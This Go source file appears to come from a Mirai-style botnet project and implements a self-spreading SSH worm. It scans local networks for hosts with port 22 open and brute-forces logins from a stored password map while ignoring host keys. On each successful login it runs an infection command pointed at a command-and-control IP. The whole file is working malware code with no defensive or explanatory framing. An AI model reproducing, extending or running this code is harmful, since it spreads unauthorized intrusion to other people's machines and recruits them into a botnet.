package worm

import (
	"fmt"
	"os"
	"sync"
	myconfig "terylene/config"
	"terylene/mirai/components/skills"
	"terylene/mirai/components/system"
	"time"

	"golang.org/x/crypto/ssh"
)

func sshattack(ip string, login map[string][]string, wg *sync.WaitGroup) {
	defer wg.Done()
	var wg2 sync.WaitGroup
	cancel := make(chan struct{})

term:
	for user, pass := range login {
		for _, i := range pass {
			select {
			case <-cancel:
				break term
			default:
				wg2.Add(1)
				go sshconnect(ip, user, i, &wg2, cancel)
				time.Sleep(1 * time.Second)
			}
		}
	}

	wg2.Wait()
	close(cancel)
}

func sshconnect(ip, user, pass string, wg *sync.WaitGroup, cancel chan struct{}) {
	defer wg.Done()
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		Timeout:         300 * time.Millisecond,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:22", ip), config)
	if err != nil {
		return
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		return
	}
	defer session.Close()

	session.Stdout = os.Stdout
	session.Stderr = os.Stderr

	if err := session.Run(fmt.Sprintf(myconfig.Infcommand, myconfig.C2ip)); err != nil {
		return
	}

	cancel <- struct{}{}
}
func sshworm(ips []string, login map[string][]string) {
	var wg sync.WaitGroup

	if len(ips) == 0 {
		return
	}

	for _, ip := range ips {
		wg.Add(1)
		go sshattack(ip, login, &wg)
	}

	wg.Wait()
}

func Startworm() {
	ip, err := system.GETIPDNS()
	if err != nil {
		return
	}
	OS, err := system.GetOS()

	if err != nil {
		return
	}

	var valid []string
	if err != nil {
		ip := system.GetIpInterface()
		if len(ip) == 0 {
			return
		}
		active := skills.Pinger(ip, OS)
		for _, ip := range active {
			if skills.IsSSHOpen(ip) {
				valid = append(valid, ip)
			}
		}
		sshworm(valid, myconfig.PasswordMap)
	}
	active := skills.Pinger(ip, OS)
	for _, ip := range active {
		if skills.IsSSHOpen(ip) {
			valid = append(valid, ip)
		}
	}
	sshworm(active, myconfig.PasswordMap)

	onlineworm()
}
